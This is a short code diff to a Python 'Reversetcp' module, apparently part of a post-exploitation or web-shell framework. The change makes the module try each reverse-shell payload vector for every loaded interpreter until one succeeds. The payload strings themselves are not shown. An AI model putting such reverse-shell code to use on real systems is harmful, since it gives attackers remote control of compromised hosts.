@@ -45,17 +45,17 @@ class Reversetcp(Module):
             
         else:
             for interpreter in self.vectors:
-                for vector in self.vectors[interpreter]:
-                    if interpreter in self.modhandler.loaded_shells:
-                        return self.__execute_payload(interpreter, vector, host, port)
+                if interpreter in self.modhandler.loaded_shells:
+                    for vector in self.vectors[interpreter]:
+                        response = self.__execute_payload(interpreter, vector, host, port)
+                        if response:
+                            return response
 
         
 
     def __execute_payload(self, interpreter, vector, host, port):
         
         payload = self.vectors[interpreter][vector] % (host, port)
-
-
         return self.modhandler.load(interpreter).run(payload, False)
         
 #        
